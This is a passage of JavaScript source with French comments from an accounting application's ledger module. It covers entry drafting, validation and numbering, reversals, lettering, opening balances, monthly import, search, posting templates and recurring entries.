  // qui écrive directement une validée — c'est ce qui garantit que tout ce qui porte un numéro est
  // passé par `validerEcriture`, donc par `ecritureValide`.
  function ajouterEcriture(livre, ecriture, qui, quand) {
    const e = {
      id: (ecriture && ecriture.id) || idEcriture(quand),
      numero: null,
      date: String((ecriture && ecriture.date) || ''),
      journal: String((ecriture && ecriture.journal) || ''),
      piece: String((ecriture && ecriture.piece) || ''),
      libelle: String((ecriture && ecriture.libelle) || ''),
      source: SOURCES_ECRITURE.includes(ecriture && ecriture.source) ? ecriture.source : 'saisie',
      mois: (ecriture && ecriture.mois) || String((ecriture && ecriture.date) || '').slice(0, 7),
      docId: (ecriture && ecriture.docId) || null,
      pieceJointe: (ecriture && ecriture.pieceJointe) || null,
      statut: 'brouillard',
      auteur: String(qui || ''),
      creeLe: Number(quand) || 0,
      valideeLe: null,
      contrepasseDe: (ecriture && ecriture.contrepasseDe) || null,
      extourneDe: (ecriture && ecriture.extourneDe) || null,
      lignes: (Array.isArray(ecriture && ecriture.lignes) ? ecriture.lignes : []).map(l => ({
        compte: String((l && l.compte) || '').trim(),
        tiersId: (l && l.tiersId) || null,
        libelle: String((l && l.libelle) || ''),
        debit: round3(Math.max(0, Number(l && l.debit) || 0)),
        credit: round3(Math.max(0, Number(l && l.credit) || 0)),
        lettre: String((l && l.lettre) || '')
      }))
    };
    e.lignes.forEach(l => assurerCompte(livre, l.compte, l.libelle));
    livre.ecritures.push(e);
    return e;
  }

  // Valider : le seul endroit où un numéro naît. Le contrôle passe AVANT l'attribution — sinon un
  // refus trouerait la numérotation, exactement le défaut que la 6.0.0 a trouvé sur `nextNumber`.
  function validerEcriture(livre, id, qui, quand) {
    const e = livre.ecritures.find(x => x.id === id);
    if (!e) return { ok: false, motif: 'Cette écriture n\'existe pas.' };
    if (e.statut !== 'brouillard') return { ok: false, motif: 'Cette écriture est déjà validée : elle se contre-passe, elle ne se revalide pas.' };
    const v = ecritureValide(e, livre.plan.map(c => c.compte));
    if (!v.ok) return { ok: false, motif: v.motif, motifs: v.motifs };
    e.numero = livre.ecritures.reduce((m, x) => Math.max(m, Number(x.numero) || 0), 0) + 1;
    e.statut = 'validee';
    e.valideeLe = Number(quand) || 0;
    trace(livre, qui, 'validation', `${e.journal} ${e.piece} n° ${e.numero}`, quand);
    return { ok: true, ecriture: e };
  }

  // Contre-passer : le MIROIR, jamais une modification ni une suppression. La date est celle du jour
  // où l'on corrige, pas celle de l'écriture d'origine — corriger en mars une écriture de janvier
  // dans un janvier déjà déclaré changerait la TVA de janvier en silence (règle 6.0.0).
  function contrepasser(livre, id, qui, dateIso, quand) {
    const e = livre.ecritures.find(x => x.id === id);
    if (!e) return { ok: false, motif: 'Cette écriture n\'existe pas.' };
    if (e.statut !== 'validee') return { ok: false, motif: 'Une écriture en brouillard se modifie : elle n\'a pas besoin d\'être contre-passée.' };
    if (livre.ecritures.some(x => x.contrepasseDe === id)) return { ok: false, motif: 'Cette écriture a déjà été contre-passée.' };
    const miroir = ajouterEcriture(livre, {
      date: dateIso, journal: e.journal, piece: e.piece,
      libelle: 'Contre-passation — ' + e.libelle,
      source: e.source, mois: String(dateIso).slice(0, 7), contrepasseDe: id,
      lignes: e.lignes.map(l => ({ compte: l.compte, tiersId: l.tiersId, libelle: l.libelle, debit: l.credit, credit: l.debit }))
    }, qui, quand);
    const r = validerEcriture(livre, miroir.id, qui, quand);
    if (!r.ok) { livre.ecritures = livre.ecritures.filter(x => x.id !== miroir.id); return r; }
    e.statut = 'contrepassee';
    trace(livre, qui, 'contre-passation', `${e.journal} ${e.piece} n° ${e.numero} → n° ${miroir.numero}`, quand);
    return { ok: true, ecriture: miroir };
  }

  // La clé d'une écriture venue d'un paquet : c'est elle qui dit « c'est la même pièce, renvoyée ».
  // Le `docId` d'abord quand il existe (il ne change jamais), la pièce ensuite.
  const cleDuPaquet = e => e.docId ? 'D:' + e.docId : 'P:' + (e.journal || '') + '|' + (e.piece || '');
  // La somme d'une écriture, pour dire en UN chiffre que deux versions diffèrent.
  const totalEcriture = e => round3((e.lignes || []).reduce((s, l) => s + (Number(l.debit) || 0), 0));

  // Importer un mois reçu. Les trois cas, et leur raison :
  //   — le mois n'était pas là → on ajoute (brouillard, ou validé si le mois est définitif) ;
  //   — il était là en brouillard → on REMPLACE : le client a rouvert son mois, sa version fait foi
  //     tant que le comptable n'a rien validé ;
  //   — il était là VALIDÉ → on ne touche à rien et on calcule l'écart. C'est la règle 3.
  function importerPaquet(livre, mois, ecritures, definitif, qui, quand) {
    const m = String(mois || '');
    const avant = livre.ecritures.filter(e => e.source === 'skanfact' && e.mois === m);
    const parCle = {};
    avant.forEach(e => { parCle[cleDuPaquet(e)] = e; });
    const res = { ajoutees: 0, remplacees: 0, ecarts: [], validees: 0 };

    // Les brouillards du mois s'en vont : ils seront réécrits depuis ce que le paquet dit.
    const aJeter = avant.filter(e => e.statut === 'brouillard').map(e => e.id);
    livre.ecritures = livre.ecritures.filter(e => !aJeter.includes(e.id));

    (Array.isArray(ecritures) ? ecritures : []).forEach(src => {
      const e = { ...src, source: 'skanfact', mois: m };
      const ancienne = parCle[cleDuPaquet(e)];
      if (ancienne && ancienne.statut !== 'brouillard') {
        // Une validée ne bouge pas. On DIT l'écart, et c'est tout : l'appliquer serait écraser le
        // travail du comptable au nom de ce que le client a refait de son côté.
        const apres = totalEcriture(e);
        if (round3(apres - totalEcriture(ancienne)) !== 0) {
          res.ecarts.push({ id: ancienne.id, piece: ancienne.piece, avant: totalEcriture(ancienne), apres });
        }
        return;
      }
      const nouvelle = ajouterEcriture(livre, e, qui || 'import', quand);
      if (ancienne) res.remplacees++; else res.ajoutees++;
      // Un mois DÉFINITIF (clôturé chez le client) entre validé : il ne bougera plus chez lui non
      // plus. Un mois provisoire reste en brouillard — le valider reviendrait à s'engager sur des
      // chiffres que le client peut encore changer.
      if (definitif && validerEcriture(livre, nouvelle.id, qui || 'import', quand).ok) res.validees++;
    });
    trace(livre, qui || 'import', 'import-paquet',
      `${m}${definitif ? ' (définitif)' : ''} — ${res.ajoutees} ajoutée(s), ${res.remplacees} remplacée(s), ${res.ecarts.length} écart(s)`, quand);
    return res;
  }

  // Lettrer : relier des écritures d'un même compte dont la somme débit − crédit fait zéro. C'est le
  // geste qui dit « cette facture est payée par ce règlement », et la somme nulle EST la preuve.
  const LETTRES = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  function prochaineLettre(livre) {
    const prises = new Set((livre.lettrages || []).map(l => l.lettre));
    for (let n = 1; n < 5; n++) {
      const gen = (i) => {
        let s = '', k = i;
        for (let j = 0; j < n; j++) { s = LETTRES[k % 26] + s; k = Math.floor(k / 26); }
        return s;
      };
      for (let i = 0; i < Math.pow(26, n); i++) { const s = gen(i); if (!prises.has(s)) return s; }
    }
    return 'ZZZZ';
  }
  function lettrer(livre, compte, ids, lettre, qui, dateIso) {
    const n = String(compte || '').trim();
    const ecr = (ids || []).map(id => livre.ecritures.find(e => e.id === id)).filter(Boolean);
    if (ecr.length !== (ids || []).length) return { ok: false, motif: 'Une des écritures à lettrer n\'existe pas.' };
    if (ecr.length < 2) return { ok: false, motif: 'Le lettrage relie au moins deux écritures : une facture et son règlement.' };
    const lignes = [];
    ecr.forEach(e => e.lignes.forEach((l, i) => { if (l.compte === n) lignes.push({ e, i, l }); }));
    if (!lignes.length) return { ok: false, motif: `Aucune de ces écritures ne touche le compte ${n}.` };
    const solde = round3(lignes.reduce((s, x) => s + x.l.debit - x.l.credit, 0));
    // La somme nulle n'est pas une formalité : un lettrage qui ne solde pas affirme qu'une facture
    // est payée alors qu'il reste quelque chose. C'est un mensonge que le grand livre propagerait.
    if (solde !== 0) return { ok: false, motif: `Ces écritures ne se soldent pas : il reste ${solde.toFixed(3)}.`, ecart: solde };
    const L = String(lettre || '').trim().toUpperCase() || prochaineLettre(livre);
    lignes.forEach(x => { x.l.lettre = L; });
    livre.lettrages.push({ lettre: L, compte: n, ecritures: ecr.map(e => e.id), le: String(dateIso || ''), par: String(qui || '') });
    return { ok: true, lettre: L };
  }
  function delettrer(livre, lettre, qui, quand) {
    const L = String(lettre || '').trim().toUpperCase();
    const avant = livre.lettrages.length;
    livre.lettrages = livre.lettrages.filter(x => x.lettre !== L);
    if (livre.lettrages.length === avant) return { ok: false, motif: 'Ce lettrage n\'existe pas.' };
    livre.ecritures.forEach(e => e.lignes.forEach(l => { if (l.lettre === L) l.lettre = ''; }));
    trace(livre, qui, 'délettrage', L, quand);
    return { ok: true };
  }

  // La balance d'ouverture d'un dossier repris ailleurs : une SEULE écriture AN, pièce OUVERTURE.
  // Refusée déséquilibrée, avec l'écart — une reprise fausse fausse tout l'exercice, et on ne la
  // découvrirait qu'au bilan.
  function balanceOuverture(livre, lignes, dateIso, source, qui, quand) {
    const L = (Array.isArray(lignes) ? lignes : [])
      .map(l => ({
        compte: String((l && l.compte) || '').trim(),
        libelle: String((l && l.libelle) || ''),
        debit: round3(Math.max(0, Number(l && l.debit) || 0)),
        credit: round3(Math.max(0, Number(l && l.credit) || 0))
      }))
      .filter(l => l.compte && (l.debit || l.credit));
    if (!L.length) return { ok: false, motif: 'La balance d\'ouverture est vide.' };
    const d = round3(L.reduce((s, l) => s + l.debit, 0));
    const c = round3(L.reduce((s, l) => s + l.credit, 0));
    if (round3(d - c) !== 0) return { ok: false, motif: `La balance ne s'équilibre pas : ${d.toFixed(3)} au débit contre ${c.toFixed(3)} au crédit.`, ecart: round3(d - c) };
    // Une seule ouverture par livre : la refaire remplace la précédente, elle ne s'y ajoute pas.
    const ancienne = livre.ecritures.filter(e => e.journal === 'AN' && e.piece === 'OUVERTURE');
    if (ancienne.some(e => e.statut === 'validee' && livre.ecritures.length > ancienne.length)) {
      // On ne retire une ouverture validée que si elle est seule : sinon tout ce qui suit s'appuie
      // dessus, et la remplacer en silence changerait chaque solde du livre.
      return { ok: false, motif: 'Ce livre porte déjà une ouverture validée et des écritures : reprendre le dossier à zéro effacerait leur point de départ.' };
    }
    livre.ecritures = livre.ecritures.filter(e => !(e.journal === 'AN' && e.piece === 'OUVERTURE'));
    const e = ajouterEcriture(livre, {
      date: dateIso, journal: 'AN', piece: 'OUVERTURE', libelle: 'Balance d\'ouverture',
      source: 'an', mois: String(dateIso).slice(0, 7), lignes: L
    }, qui, quand);
    const v = validerEcriture(livre, e.id, qui, quand);
    if (!v.ok) { livre.ecritures = livre.ecritures.filter(x => x.id !== e.id); return v; }
    livre.ouverture = { date: String(dateIso || ''), source: source || 'balance', lignes: L.map(l => ({ compte: l.compte, debit: l.debit, credit: l.credit })) };
    trace(livre, qui, 'reprise', `${L.length} compte(s), ${d.toFixed(3)}`, quand);
    return { ok: true, ecriture: e, total: d };
  }

  // Les écritures du livre, aplaties en LIGNES — la matière des quatre lectures de la 9.1.0. Un
  // brouillard n'entre pas dans une balance : ce n'est pas encore de la comptabilité.
  function lignesDuLivre(livre, opts) {
    const o = opts || {};
    return (livre.ecritures || [])
      .filter(e => o.brouillard ? true : e.statut !== 'brouillard')
      .filter(e => !o.du || (e.date >= o.du && e.date <= (o.au || '9999-12-31')))
      // Le contrat est celui d'`entreesDepuisCsv`, au champ près : `account` et `label`, pas
      // `compte` et `libelle`. C'est ce qui permet aux QUATRE lectures de la 9.1.0 de servir telles
      // quelles sur le livre — deux contrats voisins mais différents auraient obligé à réécrire la
      // balance pour le cabinet, et c'est exactement ce que ce module existe pour éviter.
      .flatMap(e => e.lignes.map(l => ({
        numero: e.numero || 0, date: e.date, journal: e.journal, piece: e.piece,
        account: l.compte, tiers: l.libelle, label: l.libelle || e.libelle,
        debit: l.debit, credit: l.credit, lettre: l.lettre || '',
        tiersId: l.tiersId || '', ecritureId: e.id, statut: e.statut
      })));
  }

  // Regrouper des LIGNES plates (celles du CSV d'un paquet) en ÉCRITURES. Le CSV du paquet est une
  // liste de lignes ; le livre, lui, raisonne en pièces — c'est la pièce qui s'équilibre, qui porte
  // un numéro et qui se contre-passe. La clé est celle de `cleDePiece` : journal, pièce, date.
  //
  // Ce que cette fonction NE fait pas : juger. Une pièce déséquilibrée passe telle quelle et se
  // fera refuser à la validation, avec son motif. La rejeter ici la ferait disparaître du livre
  // sans que personne sache qu'elle existait — le contraire de ce qu'un comptable veut.
  function piecesDepuisLignes(lignes) {
    const par = new Map();
    (lignes || []).forEach(l => {
      const cle = cleDePiece(l);
      if (!par.has(cle)) {
        par.set(cle, {
          date: l.date || '', journal: l.journal || '', piece: l.piece || '',
          libelle: l.label || '', lignes: []
        });
      }
      const e = par.get(cle);
      if (!e.libelle && l.label) e.libelle = l.label;
      e.lignes.push({
        compte: txt(l.account), tiersId: l.tiersId || null,
        libelle: l.label || l.tiers || '',
        debit: round3(num(l.debit)), credit: round3(num(l.credit)),
        lettre: l.lettre || ''
      });
    });
    return Array.from(par.values());
  }

  // ================================================================ LA SAISIE (9.3.0)
  //
  // L'écran où un comptable passe ses journées. Tout ce qui suit est PUR : les règles de la saisie
  // se prouvent sans Electron, sans disque et sans clavier.
  //
  // Ce que la 9.2.0 avait posé et qui ne bouge pas : une validée ne se modifie jamais, le numéro
  // naît à la validation, le contrôle passe AVANT l'attribution. Ce que la 9.3.0 ajoute, c'est ce
  // qu'on fait AUTOUR : modifier et supprimer un brouillard (les deux gestes qui n'existaient pas,
  // donc une saisie qu'on ne pouvait pas corriger), valider un lot, extourner, chercher, et les
  // deux mécanismes qui font gagner du temps sans jamais écrire à la place de quelqu'un — les
  // guides et les abonnements.
  //
  // Aucune de ces fonctions ne trace : c'est l'appelant qui trace, en passant `quoi` à la porte
  // d'écriture unique (`ecrireLeLivre`, 9.2.0). Deux endroits qui tracent le même geste écrivent la
  // piste d'audit en double, et une piste d'audit en double ne se lit plus.

  // Les dates, en UTC PUR (règle 5.2.3). Un jour de calendrier n'est jamais un instant : à minuit à
  // Tunis il est 23 h la veille en UTC, et toute l'arithmétique se décalerait d'un jour.
  const jourUTC = iso => new Date(String(iso) + 'T00:00:00Z');
  const isoUTC = d => d.toISOString().slice(0, 10);
  const estUnJour = iso => /^\d{4}-\d{2}-\d{2}$/.test(String(iso || ''));

  function premierDuMoisSuivant(iso) {
    if (!estUnJour(iso)) return '';
    const d = jourUTC(iso);
    return isoUTC(new Date(Date.UTC(d.getUTCFullYear(), d.getUTCMonth() + 1, 1)));
  }

  // Ajouter des mois à un jour du calendrier. Le jour se GARDE et ne recule que s'il n'existe pas
  // dans le mois d'arrivée : 31 janvier + 1 mois = 28 février, pas le 3 mars.
  function ajouterMoisIso(iso, n) {
    if (!estUnJour(iso)) return '';
    const d = jourUTC(iso);
    const cible = new Date(Date.UTC(d.getUTCFullYear(), d.getUTCMonth() + (Number(n) || 0), 1));
    const dernier = new Date(Date.UTC(cible.getUTCFullYear(), cible.getUTCMonth() + 1, 0)).getUTCDate();
    return isoUTC(new Date(Date.UTC(cible.getUTCFullYear(), cible.getUTCMonth(), Math.min(d.getUTCDate(), dernier))));
  }

  // Comparer sans accent : « interets » trouve « Intérêts ». `\p{M}` après une décomposition NFD,
  // parce qu'un intervalle de caractères combinants écrit en dur dans la source est illisible et
  // se fait manger par le premier éditeur qui normalise le fichier.
  const sansAccents = s => String(s == null ? '' : s).normalize('NFD').replace(/\p{M}/gu, '').toLowerCase();

  // Ce qui manque pour que la pièce tombe juste. C'est le moteur du « Tab solde automatiquement » :
  // l'écran ne calcule rien lui-même, sinon sa façon d'arrondir finirait par différer de celle de
  // la validation, et une pièce soldée à l'écran serait refusée à l'enregistrement.
  function soldeDeLignes(lignes) {
    const L = Array.isArray(lignes) ? lignes : [];
    const debit = round3(L.reduce((s, l) => s + Math.max(0, num(l && l.debit)), 0));
    const credit = round3(L.reduce((s, l) => s + Math.max(0, num(l && l.credit)), 0));
    const ecart = round3(debit - credit);
    return {
      debit, credit, ecart,
      equilibre: ecart === 0,
      // Ce qu'il faut poser sur une ligne neuve. Un montant négatif CHANGE DE COLONNE (règle
      // 6.3.0) : il ne garde jamais son signe.
      solde: ecart > 0 ? { debit: 0, credit: ecart } : ecart < 0 ? { debit: round3(-ecart), credit: 0 } : { debit: 0, credit: 0 }
    };
  }

  // Chercher un compte par NUMÉRO ou par NOM pendant la frappe. L'ordre n'est pas décoratif : celui
  // qui tape « 411 » veut le compte 411, pas « Achats 411xx » ; celui qui tape « client » veut les
  // comptes dont le nom commence par là. Un classement au hasard rend la liste inutilisable, et on
  // retourne taper le numéro de mémoire — ce que cette liste existe précisément pour éviter.
  function comptesQuiCorrespondent(plan, q, max) {
    const terme = sansAccents(q).trim();
    const n = Math.max(1, Number(max) || 12);
    const tous = (Array.isArray(plan) ? plan : []).filter(c => c && c.compte && !c.desactive);
    if (!terme) return tous.slice().sort((a, b) => (a.compte < b.compte ? -1 : 1)).slice(0, n);
    const mots = terme.split(/\s+/).filter(Boolean);
    const rang = c => {
      const numero = String(c.compte);
      const lib = sansAccents(c.libelle);
      if (numero === terme) return 0;
      if (numero.startsWith(terme)) return 1;
      if (lib.startsWith(terme)) return 2;
      if (mots.every(m => numero.includes(m) || lib.includes(m))) return 3;
      return -1;
    };
    return tous.map(c => ({ c, r: rang(c) })).filter(x => x.r >= 0)
      .sort((a, b) => a.r - b.r || (a.c.compte < b.c.compte ? -1 : 1))
      .slice(0, n).map(x => x.c);
  }

  // Modifier un brouillard. Le garde-fou est ici, pas dans l'écran : `modifierEcriture` est le seul
  // chemin qui touche aux lignes d'une écriture existante, et il refuse une validée. Un test relit
  // la source et exige qu'aucune autre fonction n'écrive dans `ecriture.lignes`.
  function modifierEcriture(livre, id, patch) {
    const e = (livre.ecritures || []).find(x => x.id === id);
    if (!e) return { ok: false, motif: 'Cette écriture n\'existe pas.' };
    if (e.statut !== 'brouillard') {
      return { ok: false, motif: 'Cette écriture est validée : elle ne se modifie pas, elle se contre-passe.' };
    }
    const p = patch || {};
    ['journal', 'piece', 'libelle'].forEach(k => { if (p[k] !== undefined) e[k] = String(p[k] == null ? '' : p[k]); });
    if (p.pieceJointe !== undefined) e.pieceJointe = p.pieceJointe || null;
    if (p.date !== undefined) { e.date = String(p.date || ''); e.mois = e.date.slice(0, 7); }
    if (p.source !== undefined && SOURCES_ECRITURE.includes(p.source)) e.source = p.source;
    if (Array.isArray(p.lignes)) {
      e.lignes = p.lignes.map(l => ({
        compte: String((l && l.compte) || '').trim(),
        tiersId: (l && l.tiersId) || null,
        libelle: String((l && l.libelle) || ''),
        debit: round3(Math.max(0, Number(l && l.debit) || 0)),
        credit: round3(Math.max(0, Number(l && l.credit) || 0)),
        lettre: String((l && l.lettre) || '')
      }));
      e.lignes.forEach(l => assurerCompte(livre, l.compte, l.libelle));
    }
    return { ok: true, ecriture: e };
  }

  function supprimerEcriture(livre, id) {
    const e = (livre.ecritures || []).find(x => x.id === id);
    if (!e) return { ok: false, motif: 'Cette écriture n\'existe pas.' };
    if (e.statut !== 'brouillard') {
      return { ok: false, motif: 'Une écriture validée ne se supprime pas : elle se contre-passe. C\'est ce qui fait qu\'un livre dit la vérité de ce qui a été fait.' };
    }
    if ((e.lignes || []).some(l => l.lettre)) {
      return { ok: false, motif: 'Cette écriture est lettrée : délettre d\'abord, sinon le lettrage désignerait une écriture disparue.' };
    }
    livre.ecritures = livre.ecritures.filter(x => x.id !== id);
    return { ok: true, ecriture: e };
  }

  // Valider un LOT — un journal, un mois, ou une sélection. Chaque pièce passe par `validerEcriture`
  // une par une : c'est ce qui garantit que le contrôle reste avant l'attribution, donc qu'une pièce
  // refusée au milieu du lot ne troue pas la numérotation. Les refusées sont NOMMÉES : un lot qui
  // dirait « 12 validées » en avalant 3 refus en silence serait pire qu'un refus global.
  //
  // L'ordre est celui de la DATE puis de la saisie. Le numéro suit toujours l'ordre de validation
  // (règle 2) ; valider un lot étant UN geste, autant que ses numéros se lisent dans l'ordre du
  // journal plutôt que dans celui, invisible, où les pièces ont été tapées.
  function validerLot(livre, filtre, qui, quand) {
    const f = filtre || {};
    const cibles = (livre.ecritures || [])
      .filter(e => e.statut === 'brouillard')
      .filter(e => !f.journal || e.journal === f.journal)
      .filter(e => !f.mois || String(e.date || '').slice(0, 7) === f.mois)
      .filter(e => !Array.isArray(f.ids) || f.ids.includes(e.id))
      .slice()
      .sort((a, b) => (a.date < b.date ? -1 : a.date > b.date ? 1 : (Number(a.creeLe) || 0) - (Number(b.creeLe) || 0)));
    const validees = [], refusees = [];
    cibles.forEach(e => {
      const r = validerEcriture(livre, e.id, qui, quand);
      if (r.ok) validees.push({ id: e.id, numero: e.numero, piece: e.piece, journal: e.journal, date: e.date });
      else refusees.push({ id: e.id, piece: e.piece, journal: e.journal, date: e.date, motif: r.motif, motifs: r.motifs || [] });
    });
    return { ok: true, candidates: cibles.length, validees, refusees };
  }

  // Extourner : le miroir au 1er du mois suivant. Ce n'est PAS une contre-passation — l'écriture
  // d'origine reste `validee` et garde sa place dans son mois. C'est le geste des charges à payer
  // et des produits à recevoir : on provisionne en fin de mois, on annule au début du suivant, et
  // les deux écritures existent vraiment.
  function extourner(livre, id, qui, quand) {
    const e = (livre.ecritures || []).find(x => x.id === id);
    if (!e) return { ok: false, motif: 'Cette écriture n\'existe pas.' };
    if (e.statut !== 'validee') return { ok: false, motif: 'On extourne une écriture validée. Un brouillard se modifie ou se supprime.' };
    if (livre.ecritures.some(x => x.extourneDe === id)) return { ok: false, motif: 'Cette écriture a déjà été extournée.' };
    const date = premierDuMoisSuivant(e.date);
    if (!date) return { ok: false, motif: 'Cette écriture n\'a pas de date lisible : impossible de savoir quel est le mois suivant.' };
    // Une extourne de décembre tombe au 1er janvier, c'est-à-dire dans l'exercice SUIVANT — et un
    // livre porte un seul exercice. On le dit au lieu de la poser silencieusement au mauvais
    // endroit : une écriture de janvier rangée dans le livre de décembre fausserait les deux.
    if (date > String(livre.exercice.au)) {
      return { ok: false, motif: `L'extourne tomberait le ${date}, après la fin de cet exercice (${livre.exercice.au}). Elle se saisit dans le livre de l'exercice suivant — c'est là qu'elle doit vivre.` };
    }
    const miroir = ajouterEcriture(livre, {
      date, journal: e.journal, piece: e.piece,
      libelle: 'Extourne — ' + e.libelle,
      source: e.source, mois: date.slice(0, 7), extourneDe: id,
      lignes: e.lignes.map(l => ({ compte: l.compte, tiersId: l.tiersId, libelle: l.libelle, debit: l.credit, credit: l.debit }))
    }, qui, quand);
    const r = validerEcriture(livre, miroir.id, qui, quand);
    if (!r.ok) { livre.ecritures = livre.ecritures.filter(x => x.id !== miroir.id); return r; }
    trace(livre, qui, 'extourne', `${e.journal} ${e.piece} n° ${e.numero} → n° ${miroir.numero} au ${date}`, quand);
    return { ok: true, ecriture: miroir };
  }

  // Chercher dans tout le journal de l'exercice : pièce, tiers, libellé, compte, numéro, montant.
  // Un comptable cherche « le virement de 1 191 » aussi souvent que « la facture Trabelsi » — un
  // moteur qui ne saurait pas lire un montant enverrait à la liste complète, qu'on relit à la main.
  function chercherEcritures(livre, q, opts) {
    const o = opts || {};
    const terme = sansAccents(q).trim();
    const mots = terme.split(/\s+/).filter(Boolean);
    const brut = terme.replace(',', '.');
    const montant = /^\d+(\.\d{1,3})?$/.test(brut) ? round3(Number(brut)) : null;
    return (livre.ecritures || [])
      .filter(e => !o.journal || e.journal === o.journal)
      .filter(e => !o.statut || e.statut === o.statut)
      .filter(e => !o.du || (e.date >= o.du && e.date <= (o.au || '9999-12-31')))
      .filter(e => {
        if (!mots.length) return true;
        const foin = sansAccents([
          e.piece, e.libelle, e.journal, e.date, e.numero == null ? '' : e.numero,
          (e.lignes || []).map(l => `${l.compte} ${l.libelle}`).join(' ')
        ].join(' '));
        if (mots.every(m => foin.includes(m))) return true;
        return montant != null && (e.lignes || []).some(l => round3(l.debit) === montant || round3(l.credit) === montant);
      })
      .slice()
      .sort((a, b) => (a.date < b.date ? 1 : a.date > b.date ? -1 : (Number(b.creeLe) || 0) - (Number(a.creeLe) || 0)))
      .slice(0, Math.max(1, Number(o.max) || 200));
  }

  // ---------------------------------------------------------------- guides et abonnements
  //
  // Un GUIDE préremplit, il n'écrit pas. Un ABONNEMENT est un guide plus une périodicité, et il
  // génère EN BROUILLARD, jamais une validée d'office : un logiciel qui validerait tout seul une
  // écriture que personne n'a regardée engagerait le comptable sur des chiffres qu'il n'a pas vus.
  //
  // Ni l'un ni l'autre ne vit dans `livre.json` (format figé, SPEC-DATA-005) : les guides au niveau
  // du cabinet, les abonnements sur le dossier.

  function guideValide(guide) {
    const g = guide || {};
    const motifs = [];
    if (!txt(g.nom)) motifs.push('Le guide a besoin d\'un nom : c\'est lui qu\'on tape pour le retrouver.');
    if (!txt(g.journal)) motifs.push('Le journal manque : c\'est lui qui range les écritures que ce guide produira.');
    const lignes = (Array.isArray(g.lignes) ? g.lignes : []).filter(l => l && (txt(l.compte) || txt(l.libelle)));
    if (lignes.length < 2) motifs.push('Un guide a au moins deux lignes : un compte au débit, un compte au crédit.');
    lignes.forEach((l, i) => {
      if (!/^\d{1,12}$/.test(txt(l.compte))) motifs.push(`Ligne ${i + 1} : le compte doit être un numéro.`);
      if (l.sens !== 'debit' && l.sens !== 'credit') motifs.push(`Ligne ${i + 1} : il faut dire si la ligne va au débit ou au crédit.`);
      if (txt(l.montant) && num(l.montant) < 0) motifs.push(`Ligne ${i + 1} : un montant négatif change de colonne, il ne garde pas son signe.`);
      if (txt(l.taux) && num(l.taux) < 0) motifs.push(`Ligne ${i + 1} : un taux négatif n'existe pas.`);
    });
    const soldes = lignes.filter(l => l.solde).length;
    if (soldes > 1) motifs.push('Une seule ligne peut porter le solde : deux lignes qui réclament « le reste » n\'ont pas de réponse.');
    return { ok: !motifs.length, motif: motifs[0] || '', motifs };
  }

  // Le guide appliqué. Trois façons de poser un montant sur une ligne, dans cet ordre :
  //   — `montant` fixe (un abonnement de loyer),
  //   — `taux` en pourcentage du montant de base (la TVA),
  //   — `base` : le montant de base lui-même.
  // Et `solde: true` pour la ligne qui reçoit ce qui manque. Une ligne sans rien reste à zéro : on
  // la tape. Le guide PROPOSE, il ne devine pas — c'est la règle « aucun taux écrit en dur dans un
  // calcul » (5.0.0) appliquée à la saisie : le taux vient du guide, que le comptable a réglé.
  function ecritureDepuisGuide(guide, champs) {
    const g = guide || {}, c = champs || {};
    const base = num(c.montant);
    const lignes = (Array.isArray(g.lignes) ? g.lignes : []).filter(l => l && txt(l.compte)).map(l => {
      let m = 0;
      if (txt(l.montant)) m = round3(num(l.montant));
      else if (txt(l.taux)) m = round3(base * num(l.taux) / 100);
      else if (l.base) m = round3(base);
      return {
        compte: txt(l.compte), tiersId: l.tiersId || null,
        libelle: txt(l.libelle) || txt(c.libelle) || txt(g.nom),
        debit: l.sens === 'debit' ? m : 0,
        credit: l.sens === 'credit' ? m : 0,
        lettre: '',
        _solde: !!l.solde, _sens: l.sens
      };
    });
    const s = soldeDeLignes(lignes.filter(l => !l._solde));
    lignes.forEach(l => {
      if (!l._solde) return;
      // La ligne de solde reçoit ce qui manque, DANS SA COLONNE si elle en a une : un guide qui
      // dit « le crédit va en 401 » ne doit pas voir sa ligne basculer au débit sur un cas limite.
      const v = l._sens === 'debit' ? Math.max(0, s.ecart < 0 ? round3(-s.ecart) : 0) : Math.max(0, s.ecart > 0 ? s.ecart : 0);
      l.debit = l._sens === 'debit' ? (v || s.solde.debit) : 0;
      l.credit = l._sens === 'credit' ? (v || s.solde.credit) : 0;
    });
    lignes.forEach(l => { delete l._solde; delete l._sens; });
    return {
      date: txt(c.date), journal: txt(c.journal) || txt(g.journal), piece: txt(c.piece),
      libelle: txt(c.libelle) || txt(g.nom), source: 'saisie', lignes
    };
  }

  // Les occurrences d'un abonnement qui restent à générer. `faites` porte les mois DÉJÀ générés :
  // rejouer ne double donc rien, et c'est ce qui rend le geste sûr à répéter — la même règle que
  // l'import d'un paquet (9.2.0).
  function occurrencesAGenerer(abonnement, jusquA, faites) {
    const a = abonnement || {};
    const out = [];
    if (!a.actif) return out;
    if (!estUnJour(a.depuis)) return out;
    const deja = new Set(Array.isArray(faites) ? faites : (Array.isArray(a.faites) ? a.faites : []));
    const fin = estUnJour(jusquA) ? String(jusquA) : String(a.depuis);
    const pas = Math.max(1, Number(a.tousLesMois) || 1);
    let d = String(a.depuis);
    for (let garde = 0; garde < 600 && d && d <= fin; garde++) {
      if (!txt(a.jusqua) || d <= String(a.jusqua)) {
        if (!deja.has(d.slice(0, 7))) out.push(d);
      }
      d = ajouterMoisIso(d, pas);
    }
    return out;
  }

  // ---------------------------------------------------------------- la correspondance des comptes
  //
  // Le plan du client n'est pas celui du cabinet. La table traduit À L'IMPORT et À L'EXPORT, jamais
  // en réécrivant une validée (invariant 4 de SPEC-DATA-005) : une écriture validée porte le compte
  // sous lequel elle a été validée, et c'est ce compte-là qui fait foi.
  function correspondanceValide(table) {
    const motifs = [];
    const vus = new Set();
    (Array.isArray(table) ? table : []).forEach((r, i) => {
      const de = txt(r && r.de), vers = txt(r && r.vers);
      if (!de && !vers) return;                                  // une ligne vide n'est pas une faute
      if (!de || !vers) { motifs.push(`Ligne ${i + 1} : il faut les deux comptes — celui du client et celui du cabinet.`); return; }
      if (!/^\d{1,12}$/.test(de) || !/^\d{1,12}$/.test(vers)) { motifs.push(`Ligne ${i + 1} : un compte est un numéro.`); return; }
      if (de === vers) motifs.push(`Ligne ${i + 1} : ${de} se traduirait par lui-même — cette ligne ne sert à rien.`);
      if (vus.has(de)) motifs.push(`Ligne ${i + 1} : le compte ${de} est déjà traduit plus haut. Une correspondance ne peut pas avoir deux réponses.`);
      vus.add(de);
    });
    return { ok: !motifs.length, motif: motifs[0] || '', motifs };
  }

  // La correspondance la PLUS PRÉCISE gagne : 411001 avant 411. Sans cette règle, une ligne
